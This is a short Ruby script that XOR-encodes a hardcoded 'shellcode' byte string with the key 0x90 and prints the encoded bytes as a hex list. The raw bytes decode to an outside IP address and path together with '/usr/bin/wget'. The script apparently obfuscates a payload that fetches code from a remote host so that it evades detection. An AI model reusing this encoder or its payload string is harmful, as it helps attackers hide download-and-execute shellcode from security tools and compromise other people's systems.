#!/usr/bin/ruby


puts "**xor string encoder**"

RAW_SHELLCODE="\x31\x33\x35\x2E\x32\x34\x30\x2E\x38\x31\x2E\x32\x33\x2F\x78\x6E\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x77\x67\x65\x74\x6E"

ENCODER_KEY_BYTE="\x90"
aKey=ENCODER_KEY_BYTE.bytes.to_a[0]

xored_shellcode=""
encoded_shellcode=""

RAW_SHELLCODE.bytes.each do |aByte|
    puts "xor_source=0x"+("%02x" % aByte)+"&after=0x"+("%02x" % (aByte^aKey))
    xored_shellcode.concat(aByte^aKey)
end

puts "[+]shellcode length="+RAW_SHELLCODE.length.to_s
puts "[+]after xor shellcode length="+xored_shellcode.length.to_s

xored_shellcode.bytes {|aByte| encoded_shellcode.concat("0x"+ ("%02x" % aByte)+",")}
encoded_shellcode.chomp!(",")

puts "[+] encoding done."
puts "[+] encoded shellcode size: "+(encoded_shellcode.count(",")+1).to_s
puts encoded_shellcode
